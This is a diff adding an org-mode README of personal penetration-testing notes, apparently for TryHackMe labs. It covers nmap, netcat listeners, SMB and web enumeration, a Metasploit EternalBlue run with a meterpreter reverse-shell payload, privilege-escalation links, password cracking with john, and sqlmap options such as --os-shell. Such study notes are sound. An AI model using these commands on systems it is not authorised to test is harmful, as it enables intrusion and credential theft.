@@ -1,0 +1,340 @@
+#+TITLE: Hacking - README
+#+STARTUP:CONTENT
+
+* Setup
+** Guest
+
+	#+begin_src shell
+		sudo apt install spice-vdagent
+
+		sudo systemctl enable serial-getty@ttyS0.service
+		sudo systemctl start serial-getty@ttyS0.service
+	#+end_src
+
+** Host
+
+	 #+begin_src shell
+		 vish list
+		 virsh console <guest>
+	 #+end_src
+
+	#+begin_src shell
+		pacman -S net-tools gnu-netcat bridge-tools
+	#+end_src
+
+** TryHackMe
+
+	 #+begin_src shell
+		 mkdir tryhackme
+		 sudo mount -t 9p -o trans=virtio /media/tryhackme tryhackme/
+		 nmcli connection import type openvpn file tryhackme/JoltedSloth.ovpn
+	 #+end_src
+
+* Network utilities
+** nmap                                                             :network:
+
+	 #+begin_src shell
+		 nmap -p- -T4 <ip>
+		 nmap -sC -sV -p<ports> <ip>
+
+		 ports=$(nmap -p- -T4 192.168.1.1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+	 #+end_src
+
+*** Scans
+
+		| Switch | Description          |
+		|--------+----------------------|
+		| -sT    | TCP Connect Scan     |
+		| -sS    | Syn "Half-open" Scan |
+		| -sU    | UDP scan             |
+
+*** Port specification
+
+		| Switch | Description              | Example                   |
+		|--------+--------------------------+---------------------------|
+		| -p     | Port or range            | nmap -p 22-80 192.168.1.1 |
+		| -p-    | Scan all ports           | nmap -p- 192.168.1.1      |
+		| -F     | Fast port scan (top 100) | nmap -F 192.168.1.1       |
+
+*** Service and version detection
+
+		| Switch | Description                                                                                     | Example              |
+		|--------+-------------------------------------------------------------------------------------------------+----------------------|
+		| -A     | "Aggressive scan". Enables OS detection, version detection, script scanning, and traceroute.    | nmap -A 192.168.1.1  |
+		| -O     | Enable OS detection.                                                                            | nmap -O 192.168.1.1  |
+		| -sC    | Performs a script scan using the default set of scripts. Contains scripts considered intrusive. | nmap -sC 192.168.1.1 |
+		| -sV    | Detect the version of services                                                                  | nmap -sV 192.168.1.1 |
+
+*** Output
+
+		| Switch  | Description             | Example             |
+		|---------+-------------------------+---------------------|
+		| -oN     | Normal output           |                     |
+		| -oX     | XML output              |                     |
+		| -oG     | Grepable output         |                     |
+		| -oA     | Output to all formats   |                     |
+		| -v, -vv | Verbosity               |                     |
+		| -n      | Never do DNS resolution | nmap -n 192.168.1.1 |
+		| --open  | Output only open port   |                     |
+
+** Netcat                                                           :network:
+
+	 #+begin_src shell
+		 nc -lnvp 9999
+	 #+end_src
+
+	 | Switch | Description                            |
+	 |--------+----------------------------------------|
+	 | -l     | listen mode, for inbound connects      |
+	 | -p     | local port number                      |
+	 | -e     | specify filename to exec after connect |
+	 | -n     | numeric only IP addresses, no DNS      |
+	 | -u     | UDP mode                               |
+
+* Enumeration
+** Samba
+*** smbmap                                                :samba:enumeration:
+
+		#+begin_src shell
+			smbmap -H 192.168.1.1
+		#+end_src
+
+		| Options | Description                   |
+		|---------+-------------------------------|
+		| -u      | Username to authenticate with |
+		| -p      | Password to authenticate with |
+		| -H      | IP of host                    |
+
+*** smbclient                                             :samba:enumeration:
+
+		ftp-like client to access SMB/CIFS resources on servers.
+
+		#+begin_src shell
+			smbclient -L \\\\192.168.1.1
+		#+end_src
+
+		| Option | Description                         |
+		|--------+-------------------------------------|
+		| -I     | Destination IP                      |
+		| -u     | Username to authenticate with       |
+		| -p     | Password to authenticate with       |
+		| -N     | Suppress the normal password prompt |
+
+*** impacket
+
+		Impacket is a collection of Python classes for working with network protocols, with a collection of extremely useful windows scripts.
+
+		[https://github.com/SecureAuthCorp/impacket]
+
+		Note: impacket has scripts that use other protocols and services besides samba. (TryHackMe)
+
+** Web
+*** nikto                                                   :web:enumeration:
+
+		`nikto` is a popular web scanning tool that allows users to find common web vulnerabilities. It is commonly used to check for common CVE's such as shellshock, and to get general information about the web server that you're enumerating. (TryHackMe)
+		#+end_quote
+
+
+		#+begin_src shell
+
+		#+end_src
+
+	 | Switch    | Description                                     | Example           |
+	 |-----------+-------------------------------------------------+-------------------|
+	 | -h, -host | Host(s) to target                               | -host 192.168.1.1 |
+	 | -id       | ID and password to use for basic authentication | -id "id:passwod"  |
+
+*** dirsearch                                               :web:enumeration:
+
+		#+begin_quote
+		An advanced command-line tool designed to brute force directories and files in webservers, AKA web path scanner
+		#+end_quote
+
+		[https://github.com/maurosoria/dirsearch]
+
+		#+begin_src shell
+			sudo apt-get install dirsearch
+
+			dirsearch -u http://10.10.10.28 -w /usr/share/wordlists/dirb/common.txt
+		#+end_src
+
+	 | Switch          | Description                               | Example                                                     |
+	 |-----------------+-------------------------------------------+-------------------------------------------------------------|
+	 | -u, --url       | Target URL                                | dirsearch -u http://192.168.1.1                             |
+	 | -w, --wordlists | Customize wordlists (separated by commas) | dirsearch -u TARGET -w /usr/share/wordlists/dirb/common.txt |
+
+*** gobuster                                                :web:enumeration:
+
+		A web path scanner.
+
+		#+begin_src shell
+			sudo apt-get install gobuster
+			gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
+		#+end_src
+
+	 | Commands | Description                          | Example                            |
+	 |----------+--------------------------------------+------------------------------------|
+	 | dir      | Uses directory/file enumeration mode | gobuster dir -u http://192.168.1.1 |
+
+	 | Flag           | Description |
+	 |----------------+-------------kt|
+	 | -w, --wordlist |             |
+
+**** dir
+
+		 | Flag | Description                     |
+		 |------+---------------------------------|
+		 | -x   | File extension(s) to search for |
+
+* Exploitation
+** Reverse shells
+
+	 In Kali, there are some in `/usr/share/webshells`.
+
+* Frameworks
+** Metasploit                                                     :framework:
+
+	 Metasploit is one of the most popular penetration testing frameworks around. It contains a large database of almost every major CVE, which you can easily use against a machine. (TryHackMe).
+
+	 #+begin_src shell
+		 sudo apt install metasploit-framework
+	 #+end_src
+
+	 *Example*
+
+	 #+begin_src shell
+		 msfconsole
+		 search "eternal blue"
+		 use exploit/windows/smb/ms17_010_eternalblue
+		 set RHOSTS 192.168.1.1
+		 set RPORT 80
+		 set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		 exploit
+	 #+end_src
+
+	 | Command | Description                     |
+	 |---------+---------------------------------|
+	 | search  | Search modules                  |
+	 | use     | Use module                      |
+	 | info    | Display information on a module |
+
+*** Options
+
+ | Name    | Description        | Example                |
+ |---------+--------------------+------------------------|
+ | RHOSTS  | Set target host(s) | set RHOSTS 192.168.1.1 |
+ | RPORT   | Set target port    | set RPORT 80           |
+ | payload | Set payload        | set payload <value>    |
+
+*** Exploit
+
+ | Flag | Description           |
+ |------+-----------------------|
+ | -j   | Run in the background |
+
+*** Sessions
+
+ | Flag | Description                            |
+ |------+----------------------------------------|
+ | -i   | Interact with the supplied sessions id |
+
+*** Meterpreter
+
+		Meterpreter is metasploits own "control center" where you can do various things to interact with the machine. (TryHackMe)
+		[https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/]
+
+		Note: Regular shells can usually be upgraded to meterpreter shells by using the module post/multi/manage/shell_to_meterpreter.
+
+		| Command    | Description                                                               |
+		|------------+---------------------------------------------------------------------------|
+		| download   | Download a file from the machine                                          |
+		| upoad      | Upload a file to the machine                                              |
+		| ps         | List all running processes                                                |
+		| migrate    | Change processes on the victim                                            |
+		| ls         | List files in the current directory on the machine                        |
+		| execute    | Execute a command on the remote host                                      |
+		| shell      | Start an interactie shell on the remote host                              |
+		| search     | Search files on the remote                                                |
+		| cat        | Output file on the remote                                                 |
+		| background | Put meterpreter shell in the background (allows to run other msf modules) |
+
+* Privilege escalation
+** Linux
+
+	 [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/]
+	 [https://github.com/rebootuser/LinEnum]
+	 [https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh]
+	 [https://github.com/mzet-/linux-exploit-suggester]
+
+*** GTFOBins
+
+		#+begin_quote
+		GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
+		#+end_quote
+
+		[https://gtfobins.github.io/]
+
+*** sudo
+
+		| Switch     | Description                                        |
+		|------------+----------------------------------------------------|
+		| -l, --list | list user's privileges or check a specific command |
+
+** Windows
+
+	[https://www.fuzzysecurity.com/tutorials/16.html]
+	[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp]
+	[https://github.com/411Hall/JAWS]
+* Hash Cracking
+
+	Note: Different hashing algorithms treat salts differently. Some prepend them and some append them. Research what it is you're trying to crack, and make the distinction. (TryHackMe)
+
+** hashid                                                          :cracking:
+
+	 Identify the different types of hashes used to encrypt data.
+
+** hashcat                                                         :cracking:
+
+	 [https://hashcat.net/wiki/doku.php?id=example_hashes]
+
+	 | Flag | Description               |
+	 |------+---------------------------|
+	 | -m   | Sets the mode (hash-type) |
+	 | -a   | Sets the attack mode      |
+
+** John the Ripper                                                 :cracking:
+
+	 Cracking zip file.
+
+	 #+begin_src shell
+		 zip2john target.zip > target.zip.hashes
+		 john target.zip.hashes -w /usr/share/wordlists/rockyou.txt
+	 #+end_src
+
+	 | Flag           | Description                                        |
+	 |----------------+----------------------------------------------------|
+	 | -format:FORMAT | Allows to override the ciphertext format detection |
+	 | -wordlist:FILE | Enable the wordlist mode, reading words from FILE. |
+
+* SQL Injection
+*** sqlmap                                                        :injection:
+
+		[https://www.owasp.org/index.php/SQL_Injection]
+
+		sqlmap-cheat-sheet:
+		[https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d]
+
+		| Option      | Description                                        |
+		|-------------+----------------------------------------------------|
+		| --batch     | Never ask for user input, use the default behavior |
+		| -u          | Url to check                                       |
+		| -p          | Testable parameter(s)                              |
+		| -data       | Data string to be ssent through POST               |
+		| --dbs       | Enumerate databases                                |
+		| --tables    | Enumerate tables                                   |
+		| --columns   | Enumerate columns                                  |
+		| --passwords | Enumerate passwords                                |
+		| -D          | Database to enumerate                              |
+		| -T          | Table to enumerate                                 |
+		| -C          | Column to enumerate                                |
+		| --os-shell  | Prompt for an interative operating system shell    |
